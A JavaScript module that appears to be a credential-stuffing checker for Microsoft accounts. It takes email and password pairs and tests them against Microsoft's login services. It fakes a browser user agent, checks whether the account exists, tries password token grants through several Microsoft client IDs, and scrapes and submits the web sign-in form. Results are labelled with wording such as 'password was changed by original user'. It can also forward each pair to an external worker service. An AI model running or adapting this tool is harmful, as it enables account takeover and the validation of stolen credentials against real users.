/**
 * Microsoft account checker — real status only when Microsoft says so.
 *
 * This Email doesn't exist
 * Not loginable          (MFA / code-only / no password)
 * password was changed by original user
 * Login OK
 *
 * If the host cannot complete a password proof, returns a clear
 * "Could not verify" instead of faking Not loginable.
 */
const UA =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

const MSG = {
  NO_EMAIL: "This Email doesn't exist",
  NOT_LOGINABLE: 'Not loginable',
  PASS_CHANGED: 'password was changed by original user',
  OK: 'Login OK',
  UNKNOWN: 'Could not verify (Microsoft blocked password check on this server)'
};

function cleanEmail(e) {
  return String(e || '').trim().toLowerCase();
}

function pickCookies(res) {
  try {
    if (typeof res.headers.getSetCookie === 'function') {
      return res.headers
        .getSetCookie()
        .map((c) => c.split(';')[0])
        .join('; ');
    }
  } catch (_) {}
  const sc = res.headers.get('set-cookie');
  if (!sc) return '';
  return sc
    .split(/,(?=\s*[^;=]+=)/)
    .map((c) => c.split(';')[0].trim())
    .join('; ');
}

function mergeCookie(a, b) {
  const map = {};
  for (const src of [a, b]) {
    String(src || '')
      .split(';')
      .map((s) => s.trim())
      .filter(Boolean)
      .forEach((p) => {
        const i = p.indexOf('=');
        if (i > 0) map[p.slice(0, i)] = p.slice(i + 1);
      });
  }
  return Object.entries(map)
    .map(([k, v]) => k + '=' + v)
    .join('; ');
}

/** ---------- GetCredentialType (existence + has password) ---------- */
async function getCredentialType(email) {
  // Warm-up for cookies
  let cookies = '';
  try {
    const warm = await fetch('https://login.live.com/login.srf?wa=wsignin1.0&mkt=EN-US', {
      headers: { 'User-Agent': UA, Accept: 'text/html' },
      redirect: 'follow'
    });
    cookies = pickCookies(warm);
  } catch (_) {}

  const res = await fetch('https://login.live.com/GetCredentialType.srf?mkt=EN-US&id=292841', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      'User-Agent': UA,
      Accept: 'application/json',
      Cookie: cookies,
      Origin: 'https://login.live.com',
      Referer: 'https://login.live.com/'
    },
    body: JSON.stringify({
      username: email,
      uaid: '',
      isOtherIdpSupported: true,
      checkPhones: false,
      isRemoteNGCSupported: true,
      isCookieBannerShown: false,
      isFidoSupported: true,
      forceotclogin: false,
      otclogindisallowed: false,
      isExternalFederationDisallowed: false,
      isRemoteConnectSupported: false,
      federationFlags: 0,
      isSignup: false,
      flowToken: ''
    })
  });
  const data = await res.json().catch(() => null);
  cookies = mergeCookie(cookies, pickCookies(res));
  return { data, cookies, http: res.status };
}

function fromCredentialType(data) {
  if (!data || typeof data !== 'object') return { known: false };

  const code = data.IfExistsResult;
  // Official-ish: 0 exists, 1 not, 2 federated exists?, 4 throttled/not, 5 both, 6 consumer
  if (code === 1) return { known: true, exists: false, msg: MSG.NO_EMAIL };
  if (code === 4) return { known: true, exists: false, msg: MSG.NO_EMAIL };

  if (code !== 0 && code !== 2 && code !== 5 && code !== 6 && code !== undefined) {
    return { known: false, code };
  }
  if (code === undefined || code === null) return { known: false };

  const creds = data.Credentials || {};
  const hasPassword = creds.HasPassword === true;
  const fed = !!creds.FederationRedirectUrl;

  // Work/school federated, no consumer password
  if (fed && hasPassword === false) {
    return { known: true, exists: true, hasPassword: false, msg: MSG.NOT_LOGINABLE, reason: 'federated' };
  }

  // Explicitly no password (code / authenticator only)
  if (creds.HasPassword === false) {
    return { known: true, exists: true, hasPassword: false, msg: MSG.NOT_LOGINABLE, reason: 'no_password' };
  }

  // Has password (including under "other ways") → must try password, NOT "Not loginable"
  return {
    known: true,
    exists: true,
    hasPassword: hasPassword || creds.HasPassword === undefined,
    preferOther: creds.PrefCredential !== 0 && creds.PrefCredential != null,
    msg: null
  };
}

/** ---------- OAuth password grant — read REAL AADSTS codes only ---------- */
async function oauthPassword(email, password, clientId, tokenUrl, scope) {
  const body = new URLSearchParams({
    grant_type: 'password',
    client_id: clientId,
    username: email,
    password: password,
    scope: scope
  });
  if (tokenUrl.includes('login.live.com')) {
    body.set('redirect_uri', 'https://login.live.com/oauth20_desktop.srf');
  }
  const res = await fetch(tokenUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': UA,
      Accept: 'application/json'
    },
    body: body.toString()
  });
  const data = await res.json().catch(() => ({}));
  return { http: res.status, data };
}

function mapOauth(data, http) {
  if (http === 200 && (data.access_token || data.refresh_token)) {
    return { definitive: true, ok: true, msg: MSG.OK };
  }

  const codes = []
    .concat(data.error_codes || [])
    .concat(data.errorCode ? [data.errorCode] : [])
    .map(String);
  const desc = String(data.error_description || data.error_message || data.message || data.error || '');
  const blob = (codes.join(' ') + ' ' + desc).toLowerCase();

  // Definitive: user missing
  if (codes.includes('50034') || /aadsts50034|user account does not exist|doesn't exist|user not found/i.test(blob)) {
    return { definitive: true, ok: false, msg: MSG.NO_EMAIL };
  }

  // Definitive: wrong password
  if (
    codes.includes('50126') ||
    /aadsts50126|invalid username or password|username or password is incorrect|password is incorrect/i.test(blob)
  ) {
    return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
  }

  // Definitive: MFA / proof / conditional access (password may be right)
  if (
    codes.some((c) =>
      ['50076', '50079', '50072', '50158', '50140', '53003', '53004', '50097', '50199'].includes(c)
    ) ||
    /aadsts50076|aadsts50079|aadsts50072|multi-factor|mfa required|interrupt|proofup|strong authentication/i.test(
      blob
    )
  ) {
    return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
  }

  // Account disabled / locked
  if (
    codes.some((c) => ['50057', '50005', '50053'].includes(c)) ||
    /disabled|locked|blocked due/i.test(blob)
  ) {
    return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
  }

  // ROPC not allowed for this client / interaction_required without MFA code
  // → NOT definitive (don't fake Not loginable)
  if (
    codes.some((c) => ['700016', '7000218', '50194', '65001', '70000'].includes(c)) ||
    /ropc|public clients|resource owner|interaction_required|aadb2c|invalid_client/i.test(blob)
  ) {
    return { definitive: false, ok: false, msg: null, raw: desc.slice(0, 240) };
  }

  if (/invalid_grant/i.test(blob) && /password/i.test(blob)) {
    return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
  }

  return { definitive: false, ok: false, msg: null, raw: desc.slice(0, 240) };
}

/** ---------- HTML login.live.com password post ---------- */
async function htmlPasswordCheck(email, password, seedCookies) {
  const loginUrl = 'https://login.live.com/login.srf?wa=wsignin1.0&mkt=en-US&id=292841';
  const pageRes = await fetch(loginUrl, {
    headers: {
      'User-Agent': UA,
      Accept: 'text/html',
      Cookie: seedCookies || '',
      'Accept-Language': 'en-US,en;q=0.9'
    },
    redirect: 'follow'
  });
  const html = await pageRes.text();
  let cookies = mergeCookie(seedCookies, pickCookies(pageRes));

  const ppft =
    (html.match(/name="PPFT"[^>]*value="([^"]+)"/i) || [])[1] ||
    (html.match(/"sFT":"([^"]+)"/i) || [])[1] ||
    (html.match(/sFT:'([^']+)'/i) || [])[1] ||
    '';

  let urlPost =
    (html.match(/urlPost:"([^"]+)"/i) || [])[1] ||
    (html.match(/urlPost:'([^']+)'/i) || [])[1] ||
    'https://login.live.com/ppsecure/post.srf';
  urlPost = urlPost.replace(/\\u0026/g, '&').replace(/\\\//g, '/');

  if (!ppft) {
    return { definitive: false, reason: 'no_ppft' };
  }

  const form = new URLSearchParams({
    login: email,
    loginfmt: email,
    passwd: password,
    PPFT: ppft,
    type: '11',
    LoginOptions: '3',
    NewUser: '1',
    PPSX: 'Passp',
    ps: '2',
    i13: '0',
    i19: '12000',
    IsFidoSupported: '1'
  });

  const postRes = await fetch(urlPost, {
    method: 'POST',
    headers: {
      'User-Agent': UA,
      'Content-Type': 'application/x-www-form-urlencoded',
      Cookie: cookies,
      Origin: 'https://login.live.com',
      Referer: loginUrl
    },
    body: form.toString(),
    redirect: 'manual'
  });

  const loc = postRes.headers.get('location') || '';
  const body = await postRes.text().catch(() => '');
  const all = (body + '\n' + loc).toLowerCase();

  if (/account\.microsoft\.com|office\.com|onedrive|completesignin|oauth20_authorize/i.test(loc)) {
    if (/proof|identity|auth\/full|otp|securitycode|interrupt/i.test(loc + body)) {
      return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE, stage: 'proof' };
    }
    return { definitive: true, ok: true, msg: MSG.OK };
  }

  if (
    /password is incorrect|account or password is incorrect|doesn'?t exist.*password|serrorcode["\s:]*["']?80041012|wrong password/i.test(
      all
    )
  ) {
    return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
  }

  if (
    /other ways to sign in|sign in another way|use a code|one-time code|approve a sign-in|authenticator app|texts a code|verify your identity|help us protect/i.test(
      all
    )
  ) {
    // If page still offers password field, try to treat as "has password path"
    if (/name="passwd"|type="password"/i.test(body) && /incorrect|password error/i.test(all)) {
      return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
    }
    // "Other ways" only and no successful password — if we already know HasPassword, prefer PASS_CHANGED when error text says password
    if (/password/i.test(all) && /incorrect|error/i.test(all)) {
      return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
    }
    return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE, stage: 'other_ways' };
  }

  if (/that microsoft account doesn'?t exist|we couldn'?t find|no account/i.test(all)) {
    return { definitive: true, ok: false, msg: MSG.NO_EMAIL };
  }

  // Form shown again without clear error
  if (postRes.status === 200 && /name="passwd"/i.test(body)) {
    const err =
      (body.match(/id="passwordError"[^>]*>([^<]+)</i) || [])[1] ||
      (body.match(/id="usernameError"[^>]*>([^<]+)</i) || [])[1] ||
      '';
    if (/incorrect|wrong/i.test(err)) {
      return { definitive: true, ok: false, msg: MSG.PASS_CHANGED, raw: err };
    }
    if (/doesn'?t exist|couldn'?t find/i.test(err)) {
      return { definitive: true, ok: false, msg: MSG.NO_EMAIL, raw: err };
    }
  }

  return { definitive: false, reason: 'html_inconclusive', http: postRes.status };
}

async function tryWorker(email, password) {
  const base = String(process.env.PASS_WORKER_URL || '').replace(/\/$/, '');
  if (!base) return null;
  try {
    const res = await fetch(base + '/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, type: 'check' })
    });
    return await res.json().catch(() => null);
  } catch (e) {
    return { error: e.message };
  }
}

function mapWorker(data) {
  if (!data) return null;
  if (data.ok === true || data.status === 'success') {
    return { ok: true, summary: MSG.OK, error: null };
  }
  const err = String(data.error || data.message || data.result || data.status || '').toLowerCase();
  if (!err) return null;
  if (/50034|not exist|doesn'?t exist|does not exist|no account|unknown user/.test(err)) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL };
  }
  if (/50126|incorrect|wrong password|invalid username or password|password changed/.test(err)) {
    return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED };
  }
  if (/50076|50079|mfa|2fa|authenticator|other way|not loginable|otp|code only|no password/.test(err)) {
    return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE };
  }
  return { ok: false, summary: String(data.error || data.message).slice(0, 200), error: String(data.error || data.message).slice(0, 200) };
}

/**
 * Main entry
 */
async function checkMicrosoft(email, password) {
  email = cleanEmail(email);
  password = String(password || '');
  const details = { steps: [] };

  if (!email.includes('@')) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
  }
  if (!password) {
    return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED, details };
  }

  // 0) Worker (best)
  const worker = await tryWorker(email, password);
  if (worker) {
    details.worker = worker;
    const m = mapWorker(worker);
    if (m) return { ...m, details };
  }

  // 1) Existence / has-password
  let ctInfo = { known: false };
  let cookies = '';
  try {
    const ct = await getCredentialType(email);
    details.credentialType = ct.data;
    details.steps.push('GetCredentialType http ' + ct.http);
    cookies = ct.cookies || '';
    ctInfo = fromCredentialType(ct.data);
    details.exists = ctInfo;

    if (ctInfo.known && ctInfo.exists === false) {
      return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
    }
    // Only "Not loginable" when Microsoft says there is NO password credential
    if (ctInfo.msg === MSG.NOT_LOGINABLE && ctInfo.hasPassword === false) {
      return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
    }
  } catch (e) {
    details.ctError = e.message;
  }

  // 2) OAuth probes — only trust definitive AADSTS codes
  const clients = [
    {
      id: '000000004C12AE6F',
      token: 'https://login.live.com/oauth20_token.srf',
      scope: 'service::user.auth.xboxlive.com::MBI_SSL'
    },
    {
      id: '1f907974-e22b-4810-a9de-d282292ec59c',
      token: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
      scope: 'openid offline_access'
    },
    {
      id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
      token: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
      scope: 'openid offline_access https://graph.microsoft.com/.default'
    }
  ];

  for (const c of clients) {
    try {
      const r = await oauthPassword(email, password, c.id, c.token, c.scope);
      const mapped = mapOauth(r.data, r.http);
      details.steps.push({
        client: c.id,
        definitive: mapped.definitive,
        msg: mapped.msg,
        raw: (r.data.error_description || r.data.error || '').toString().slice(0, 160)
      });
      if (mapped.definitive) {
        return {
          ok: !!mapped.ok,
          summary: mapped.msg,
          error: mapped.ok ? null : mapped.msg,
          details
        };
      }
    } catch (e) {
      details.steps.push({ client: c.id, error: e.message });
    }
  }

  // 3) HTML form password (uses password even when UI says "other ways")
  try {
    const html = await htmlPasswordCheck(email, password, cookies);
    details.html = { definitive: html.definitive, msg: html.msg, reason: html.reason, stage: html.stage };
    if (html.definitive) {
      return {
        ok: !!html.ok,
        summary: html.msg,
        error: html.ok ? null : html.msg,
        details
      };
    }
  } catch (e) {
    details.htmlError = e.message;
  }

  // 4) Honest fallback — do NOT mark everything Not loginable
  if (ctInfo.known && ctInfo.exists && ctInfo.hasPassword === false) {
    return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
  }

  return {
    ok: false,
    summary: MSG.UNKNOWN,
    error: MSG.UNKNOWN,
    details
  };
}

module.exports = { checkMicrosoft, MSG };
